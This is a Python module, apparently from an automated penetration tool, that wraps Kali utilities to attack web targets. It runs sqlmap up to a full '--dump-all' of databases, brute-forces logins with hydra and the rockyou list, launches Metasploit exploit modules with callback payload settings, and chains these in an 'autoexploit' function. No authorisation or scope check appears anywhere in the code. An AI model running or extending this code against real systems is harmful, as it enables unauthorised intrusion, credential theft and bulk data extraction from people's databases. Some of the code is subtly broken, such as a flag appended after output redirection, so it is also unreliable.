import json, re, time, os, uuid, shlex, urllib.parse
from typing import Optional, Dict, List
from tools.log_utils import get_logger
from tools.kali_executor import get_kali, is_available, has_tool

logger = get_logger("kali_toolset")


# ---------------------------------------------------------------------------
# sqlmap wrapper
# ---------------------------------------------------------------------------

SQLMAP_OUTPUT_DIR = "/tmp/aimy_sqlmap"


def sqlmap_detect(url: str, param: str, dbms: Optional[str] = None) -> Dict:
    kali = get_kali()
    if not kali:
        return {"vulnerable": False, "error": "Kali not connected"}
    if not has_tool("sqlmap") and not kali.check_tool("sqlmap"):
        return {"vulnerable": False, "error": "sqlmap not found on Kali"}

    tag = uuid.uuid4().hex[:8]
    output_dir = f"{SQLMAP_OUTPUT_DIR}/{tag}"
    quoted_url = shlex.quote(url)
    quoted_param = shlex.quote(param)
    cmd = (
        f"sqlmap -u {quoted_url}?{quoted_param}=1 "
        f"--batch --output-dir={shlex.quote(output_dir)} "
        f"--time-sec=3 --level=3 --risk=2 "
        f"--random-agent --flush-session "
    )
    if dbms:
        cmd += f"--dbms={shlex.quote(dbms)} "
    cmd += "2>&1"

    start = time.time()
    r = kali.run(cmd, timeout=300)
    elapsed = time.time() - start
    stdout = r.get("stdout", "")
    stderr = r.get("stderr", "")

    result = {
        "vulnerable": False,
        "tool": "sqlmap",
        "elapsed": round(elapsed, 1),
        "dbms": None,
        "technique": None,
        "data": {},
        "error": None,
        "raw_output": stdout[-2000:] if len(stdout) > 2000 else stdout,
    }

    if "all tested parameters" in stdout and "not injectable" in stdout:
        result["vulnerable"] = False
        result["note"] = "sqlmap: not injectable"
        return result

    if "got a refresh" in stdout or "is vulnerable" in stdout:
        result["vulnerable"] = True

    dbms_match = re.search(r"web application technology:\s*(.+?)(?:\n|$)", stdout, re.I)
    if dbms_match:
        result["dbms"] = dbms_match.group(1).strip()

    tech_match = re.search(r"Type:\s*(.+?)(?:\n|$)", stdout, re.I)
    if tech_match:
        result["technique"] = tech_match.group(1).strip()

    payload_match = re.search(r"Parameter:\s*(\w+)\s+\((.+?)\)", stdout)
    if payload_match:
        result["injected_param"] = payload_match.group(1)
        result["injection_type"] = payload_match.group(2)

    # Try to read extracted data from sqlmap output
    data_pattern = re.compile(
        r'\[\d+:\d+:\d+\]\s*\[INFO\]\s*table\s*\'(.+?)\'\.\'(.+?)\'.*?\n'
        r'(.*?)(?=\n\[|\Z)', re.DOTALL
    )
    data_matches = data_pattern.findall(stdout)
    for table, column, data_block in data_matches:
        rows = re.findall(r"\|(.+?)\|", data_block)
        if rows:
            result["data"][f"{table}.{column}"] = rows[:20]

    # Check log files for extracted data
    log_path = f"{output_dir}/log"
    log_content = kali.read_file_lines(log_path)
    for line in log_content[-50:]:
        dmp = re.search(r"\[INFO\]\s*retrieved:\s*'(.+?)'", line)
        if dmp:
            val = dmp.group(1)
            result["data"]["retrieved"] = result["data"].get("retrieved", []) + [val]

    if not result["data"] and result["vulnerable"]:
        result["data"]["note"] = "SQLi confirmed, run sqlmap_extract() for full data dump"

    return result


def sqlmap_extract(url: str, param: str, dbms: Optional[str] = None,
                   queries: Optional[List[str]] = None) -> Dict:
    kali = get_kali()
    if not kali:
        return {"success": False, "error": "Kali not connected"}

    tag = uuid.uuid4().hex[:8]
    output_dir = f"{SQLMAP_OUTPUT_DIR}/{tag}"
    result = {"success": False, "data": {}}
    quoted_url = shlex.quote(url)
    quoted_param = shlex.quote(param)
    quoted_outdir = shlex.quote(output_dir)

    if not queries:
        queries = ["--dbs", "--current-db"]
        cmd = (
            f"sqlmap -u {quoted_url}?{quoted_param}=1 --batch "
            f"--output-dir={quoted_outdir} --time-sec=3 "
            f"--random-agent --no-cast "
        )
        if dbms:
            cmd += f"--dbms={shlex.quote(dbms)} "
        cmd += "--dbs 2>&1"
        r = kali.run(cmd, timeout=600)
        stdout = r.get("stdout", "")
        dbs = re.findall(r"\[\*\]\s+(.+?)(?:\n|$)", stdout)
        dbs = [d.strip() for d in dbs if d.strip() and d.strip() != "*"]
        if dbs:
            result["data"]["databases"] = dbs

        cmd = (
            f"sqlmap -u {quoted_url}?{quoted_param}=1 --batch "
            f"--output-dir={quoted_outdir} --time-sec=3 "
            f"--random-agent --no-cast "
        )
        if dbms:
            cmd += f"--dbms={shlex.quote(dbms)} "
        cmd += "--current-db --tables 2>&1"
        r = kali.run(cmd, timeout=600)
        stdout = r.get("stdout", "")
        tables = re.findall(r"\| (.+?) \|", stdout)
        if tables:
            result["data"]["tables"] = tables

        cmd = (
            f"sqlmap -u {quoted_url}?{quoted_param}=1 --batch "
            f"--output-dir={quoted_outdir} --time-sec=3 "
            f"--random-agent --no-cast --dump-all "
            f"--threads=4 2>&1"
        )
        if dbms:
            cmd += f"--dbms={shlex.quote(dbms)} "

        logger.info("sqlmap full dump started (may take minutes)...")
        r = kali.run(cmd, timeout=1800)
        stdout = r.get("stdout", "")

        # Parse dumped data
        dump_re = re.compile(
            r"Table:\s+(.+?)\n.*?\[(\d+)\].*?\n(.*?)(?=\n\[|\Z)", re.DOTALL
        )
        for match in dump_re.finditer(stdout):
            tbl = match.group(1).strip()
            rows = re.findall(r"\|(.+?)\|", match.group(3))
            if rows:
                result["data"][f"dump_{tbl}"] = rows

        result["success"] = True

    return result


# ---------------------------------------------------------------------------
# nmap wrapper
# ---------------------------------------------------------------------------

def nmap_scan(target: str, ports: str = "21,22,80,443,3306,6379,8080,8443,9200,27017",
              fast: bool = True) -> Dict:
    kali = get_kali()
    if not kali:
        return {"success": False, "error": "Kali not connected"}
    if not has_tool("nmap") and not kali.check_tool("nmap"):
        return {"success": False, "error": "nmap not found on Kali"}

    quoted_target = shlex.quote(target)
    if fast:
        cmd = f"nmap -T4 -F --open -oG - {quoted_target} 2>&1"
    else:
        cmd = f"nmap -sV -sC -p {shlex.quote(ports)} --open -oG - {quoted_target} 2>&1"

    r = kali.run(cmd, timeout=300)
    stdout = r.get("stdout", "")

    ports_found = []
    for line in stdout.splitlines():
        if "/open/" in line or "/open|" in line:
            parts = line.split()
            for part in parts:
                m = re.match(r"(\d+)/(open|filtered)/(tcp|udp)", part)
                if m:
                    entry = {"port": int(m.group(1)), "state": m.group(2), "protocol": m.group(3)}
                    ports_found.append(entry)

    os_info = ""
    os_m = re.search(r"OS: (.+)", stdout)
    if os_m:
        os_info = os_m.group(1).strip()

    return {
        "success": True,
        "target": target,
        "ports": ports_found,
        "count": len(ports_found),
        "os": os_info,
        "raw": stdout[:2000] if len(stdout) > 2000 else stdout,
    }


# ---------------------------------------------------------------------------
# ffuf wrapper
# ---------------------------------------------------------------------------

def ffuf_discover(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                  extensions: str = "", threads: int = 50) -> Dict:
    kali = get_kali()
    if not kali:
        return {"success": False, "error": "Kali not connected"}
    if not has_tool("ffuf") and not kali.check_tool("ffuf"):
        return {"success": False, "error": "ffuf not found on Kali"}

    target = url.rstrip("/") + "/FUZZ"
    cmd = f"ffuf -u {shlex.quote(target)} -w {shlex.quote(wordlist)} -t {threads} -fc 404 -of json -o /tmp/ffuf_out.json 2>/dev/null"
    if extensions:
        cmd += f" -e {shlex.quote(extensions)}"
    cmd += " && cat /tmp/ffuf_out.json 2>/dev/null"

    r = kali.run(cmd, timeout=120)
    stdout = r.get("stdout", "")

    results = []
    try:
        data = json.loads(stdout)
        for entry in data.get("results", []):
            results.append({
                "path": entry.get("input", {}).get("FUZZ", ""),
                "status": entry.get("status"),
                "size": entry.get("length", 0),
            })
    except (json.JSONDecodeError, TypeError):
        for line in stdout.splitlines():
            m = re.match(r"FUZZ:\s*(\S+)", line)
            if m:
                results.append({"path": m.group(1)})

    return {
        "success": True,
        "url": url,
        "paths": results,
        "count": len(results),
    }


# ---------------------------------------------------------------------------
# nuclei wrapper
# ---------------------------------------------------------------------------

def nuclei_scan(target: str, severity: str = "medium,high,critical",
                templates: str = "") -> Dict:
    kali = get_kali()
    if not kali:
        return {"success": False, "error": "Kali not connected"}
    if not has_tool("nuclei") and not kali.check_tool("nuclei"):
        return {"success": False, "error": "nuclei not found on Kali"}

    quoted_target = shlex.quote(target)
    cmd = f"nuclei -u {quoted_target} -severity {shlex.quote(severity)} -json -o /tmp/nuclei_out.json 2>/dev/null"
    if templates:
        cmd = f"nuclei -u {quoted_target} -t {shlex.quote(templates)} -json -o /tmp/nuclei_out.json 2>/dev/null"
    cmd += " && cat /tmp/nuclei_out.json 2>/dev/null"

    r = kali.run(cmd, timeout=300)
    stdout = r.get("stdout", "")

    findings = []
    for line in stdout.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            entry = json.loads(line)
            findings.append({
                "template": entry.get("template-id", ""),
                "name": entry.get("info", {}).get("name", ""),
                "severity": entry.get("info", {}).get("severity", ""),
                "matched": entry.get("matched-at", ""),
                "type": entry.get("type", ""),
            })
        except json.JSONDecodeError:
            pass

    return {
        "success": True,
        "target": target,
        "findings": findings,
        "count": len(findings),
    }


# ---------------------------------------------------------------------------
# whatweb wrapper
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# hydra wrapper
# ---------------------------------------------------------------------------

def hydra_brute(target: str, service: str = "ssh",
                userlist: str = "/usr/share/wordlists/metasploit/namelist.txt",
                passlist: str = "/usr/share/wordlists/rockyou.txt.gz",
                user: str = "", threads: int = 4, port: int = 0) -> Dict:
    kali = get_kali()
    if not kali:
        return {"success": False, "error": "Kali not connected"}
    if not has_tool("hydra") and not kali.check_tool("hydra"):
        return {"success": False, "error": "hydra not found on Kali"}

    port_opt = "-s %d" % port if port else ""
    if user:
        cmd = "hydra -l %s -P %s %s %s %s %s 2>&1" % (
            shlex.quote(user), shlex.quote(passlist),
            port_opt, shlex.quote(target), shlex.quote(service), "-t %d" % threads)
    else:
        cmd = "hydra -L %s -P %s %s %s %s %s 2>&1" % (
            shlex.quote(userlist), shlex.quote(passlist),
            port_opt, shlex.quote(target), shlex.quote(service), "-t %d" % threads)

    r = kali.run(cmd, timeout=600)
    stdout = r.get("stdout", "")

    found = []
    for line in stdout.splitlines():
        m = re.search(r"\[(\d+)\]\[(\w+)\]\s+host:\s+\S+\s+login:\s+(\S+)\s+password:\s+(\S+)", line)
        if m:
            found.append({
                "port": int(m.group(1)),
                "service": m.group(2),
                "username": m.group(3),
                "password": m.group(4),
            })

    return {
        "success": bool(found) or r["success"],
        "service": service,
        "target": target,
        "credentials": found,
        "count": len(found),
        "raw": stdout[:2000] if len(stdout) > 2000 else stdout,
    }


# ---------------------------------------------------------------------------
# nikto wrapper
# ---------------------------------------------------------------------------

def nikto_scan(url: str, max_time: int = 60, ssl: bool = False) -> Dict:
    kali = get_kali()
    if not kali:
        return {"success": False, "error": "Kali not connected"}
    if not has_tool("nikto") and not kali.check_tool("nikto"):
        return {"success": False, "error": "nikto not found on Kali"}

    ssl_opt = "-ssl" if ssl else ""
    cmd = "nikto -h %s %s -Format json -o /tmp/nikto_out.json -maxtime %d 2>&1 && cat /tmp/nikto_out.json 2>/dev/null" % (
        shlex.quote(url), ssl_opt, max_time)

    r = kali.run(cmd, timeout=max_time + 30)
    stdout = r.get("stdout", "")

    findings = []
    try:
        data = json.loads(stdout)
        for item in data if isinstance(data, list) else data.get("vulnerabilities", []):
            findings.append({
                "id": item.get("id", ""),
                "method": item.get("method", ""),
                "url": item.get("url", ""),
                "description": item.get("msg", item.get("description", "")),
            })
    except (json.JSONDecodeError, TypeError):
        for line in stdout.splitlines():
            m = re.search(r"\+ (OSVDB-\d+|NIKTO-\d+):\s*(.+)", line)
            if m:
                findings.append({
                    "id": m.group(1),
                    "description": m.group(2).strip(),
                })

    return {
        "success": True,
        "url": url,
        "findings": findings,
        "count": len(findings),
        "raw": stdout[:2000] if len(stdout) > 2000 else stdout,
    }


# ---------------------------------------------------------------------------
# gobuster wrapper
# ---------------------------------------------------------------------------

def gobuster_discover(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                      extensions: str = "php,txt,zip,bak,html,asp,aspx,jsp",
                      threads: int = 30) -> Dict:
    kali = get_kali()
    if not kali:
        return {"success": False, "error": "Kali not connected"}
    if not has_tool("gobuster") and not kali.check_tool("gobuster"):
        return {"success": False, "error": "gobuster not found on Kali"}

    ext_opt = "-x %s" % shlex.quote(extensions) if extensions else ""
    cmd = "gobuster dir -u %s -w %s %s -t %d -q -o /tmp/gobuster_out.txt 2>&1 && cat /tmp/gobuster_out.txt 2>/dev/null" % (
        shlex.quote(url), shlex.quote(wordlist), ext_opt, threads)

    r = kali.run(cmd, timeout=180)
    stdout = r.get("stdout", "")

    results = []
    for line in stdout.splitlines():
        m = re.match(r"(/\S+)\s+\(Status:\s*(\d+)\)", line)
        if m:
            results.append({
                "path": m.group(1),
                "status": int(m.group(2)),
            })

    return {
        "success": True,
        "url": url,
        "paths": results,
        "count": len(results),
    }


# ---------------------------------------------------------------------------
# wpscan wrapper
# ---------------------------------------------------------------------------

def wpscan_scan(url: str, enumerate_all: bool = True,
                api_token: str = "") -> Dict:
    kali = get_kali()
    if not kali:
        return {"success": False, "error": "Kali not connected"}
    if not has_tool("wpscan") and not kali.check_tool("wpscan"):
        return {"success": False, "error": "wpscan not found on Kali"}

    enum_opt = "--enumerate ap,at,tt,cb,dbe,u,m" if enumerate_all else ""
    token_opt = "--api-token %s" % shlex.quote(api_token) if api_token else ""
    cmd = "wpscan --url %s %s %s --format json -o /tmp/wpscan_out.json 2>/dev/null && cat /tmp/wpscan_out.json 2>/dev/null" % (
        shlex.quote(url), enum_opt, token_opt)

    r = kali.run(cmd, timeout=300)
    stdout = r.get("stdout", "")

    vulns = []
    try:
        data = json.loads(stdout)
        for finding in data.get("findings", []):
            vulns.append({
                "type": finding.get("type", ""),
                "title": finding.get("title", ""),
                "severity": finding.get("severity", ""),
                "fixed_in": finding.get("fixed_in", ""),
            })
    except (json.JSONDecodeError, TypeError):
        for line in stdout.splitlines():
            m = re.search(r"\[!\]\s*(.+)", line)
            if m:
                vulns.append({"description": m.group(1).strip()})

    return {
        "success": True,
        "url": url,
        "vulnerabilities": vulns,
        "count": len(vulns),
        "raw": stdout[:2000] if len(stdout) > 2000 else stdout,
    }


# ---------------------------------------------------------------------------
# metasploit wrapper (resource script execution)
# ---------------------------------------------------------------------------

def metasploit_run(resource_script: str, payload: str = "",
                   lhost: str = "", lport: int = 4444,
                   rhost: str = "", rport: int = 80) -> Dict:
    kali = get_kali()
    if not kali:
        return {"success": False, "error": "Kali not connected"}
    if not has_tool("msfconsole") and not kali.check_tool("msfconsole"):
        return {"success": False, "error": "msfconsole not found on Kali"}

    rc_content = resource_script
    if payload:
        rc_content += "\nset PAYLOAD %s" % payload
    if lhost:
        rc_content += "\nset LHOST %s" % lhost
    if lport:
        rc_content += "\nset LPORT %d" % lport
    if rhost:
        rc_content += "\nset RHOSTS %s" % rhost
    if rport:
        rc_content += "\nset RPORT %d" % rport
    rc_content += "\nexit\n"

    rc_path = "/tmp/aimy_msf_%s.rc" % uuid.uuid4().hex[:8]
    kali.write_file(rc_path, rc_content)

    cmd = "msfconsole -q -r %s 2>&1" % shlex.quote(rc_path)
    r = kali.run(cmd, timeout=120)
    kali.run("rm -f %s" % shlex.quote(rc_path), timeout=5)

    return {
        "success": r["success"],
        "exit_code": r.get("exit_code", -1),
        "stdout": r.get("stdout", "")[:3000],
        "stderr": r.get("stderr", "")[:1000],
    }


def metasploit_exploit(module: str, rhost: str, rport: int = 80,
                       payload: str = "", lhost: str = "",
                       lport: int = 4444, ssl: bool = False) -> Dict:
    rc = "use %s\n" % module
    rc += "set RHOSTS %s\n" % rhost
    rc += "set RPORT %d\n" % rport
    if lhost:
        rc += "set LHOST %s\n" % lhost
    if lport:
        rc += "set LPORT %d\n" % lport
    if ssl:
        rc += "set SSL true\n"
    rc += "set ExitOnSession false\n"
    rc += "run -j\n"
    return metasploit_run(rc, payload=payload, lhost=lhost, lport=lport,
                          rhost=rhost, rport=rport)


# ---------------------------------------------------------------------------
# Auto-exploit: pick Kali tool by vulnerability type
# ---------------------------------------------------------------------------

KALI_EXPLOIT_MAP = {
    "sqli":      {"tool": "sqlmap",       "func": "sqlmap_detect"},
    "cmdi":      {"tool": "metasploit",   "func": "metasploit_exploit"},
    "xss":       {"tool": "metasploit",   "func": "metasploit_exploit"},
    "lfi":       {"tool": "metasploit",   "func": "metasploit_exploit"},
    "ssrf":      {"tool": "metasploit",   "func": "metasploit_exploit"},
    "http":      {"tool": "nikto",        "func": "nikto_scan"},
    "service":   {"tool": "hydra",        "func": "hydra_brute"},
    "wordpress": {"tool": "wpscan",       "func": "wpscan_scan"},
}


def autoexploit(url: str, vuln_type: str, param: str = "",
                extra: Optional[Dict] = None) -> Dict:
    result = {"vuln_type": vuln_type, "exploits": {}}

    if vuln_type == "sqli":
        dbms = (extra or {}).get("dbms", "")
        r = sqlmap_detect(url, param, dbms=dbms or None)
        result["exploits"]["sqlmap"] = r
        if r.get("vulnerable") or r.get("data"):
            result["success"] = True
            result["data"] = r.get("data", {})
        return result

    if vuln_type == "http":
        r = nikto_scan(url)
        result["exploits"]["nikto"] = r
        if r.get("findings"):
            result["success"] = True
        return result

    if vuln_type == "service":
        service = (extra or {}).get("service", "ssh")
        user = (extra or {}).get("user", "")
        target = (extra or {}).get("target", url)
        r = hydra_brute(target, service=service, user=user)
        result["exploits"]["hydra"] = r
        if r.get("credentials"):
            result["success"] = True
            result["credentials"] = r["credentials"]
        return result

    if vuln_type == "wordpress":
        r = wpscan_scan(url)
        result["exploits"]["wpscan"] = r
        if r.get("vulnerabilities"):
            result["success"] = True
        return result

    if vuln_type in ("cmdi", "xss", "lfi", "ssrf"):
        msf_module_map = {
            "cmdi":  "exploit/multi/http/http_cmd_exec",
            "xss":   "auxiliary/gather/http_xss_scanner",
            "lfi":   "exploit/unix/webapp/local_file_include",
            "ssrf":  "auxiliary/scanner/http/ssrf_scanner",
        }
        mod = msf_module_map.get(vuln_type)
        if mod:
            parsed = urllib.parse.urlparse(url)
            rhost = parsed.hostname or url
            rport = parsed.port or (443 if parsed.scheme == "https" else 80)
            r = metasploit_exploit(mod, rhost, rport)
            result["exploits"]["metasploit"] = r
            if r.get("success"):
                result["success"] = True
        return result

    result["success"] = False
    result["error"] = "Unknown vulnerability type: %s" % vuln_type
    return result


def whatweb_identify(target: str) -> Dict:
    kali = get_kali()
    if not kali:
        return {"success": False, "error": "Kali not connected"}
    if not has_tool("whatweb") and not kali.check_tool("whatweb"):
        return {"success": False, "error": "whatweb not found on Kali"}

    cmd = f"whatweb -a 3 --color=never {shlex.quote(target)} 2>/dev/null"
    r = kali.run(cmd, timeout=60)
    stdout = r.get("stdout", "")

    techs = []
    tech_m = re.findall(r'([\w\s]+?)\[', stdout)
    if tech_m:
        techs = [t.strip() for t in tech_m if t.strip()]

    return {
        "success": True,
        "target": target,
        "technologies": techs,
        "raw": stdout.strip(),
    }
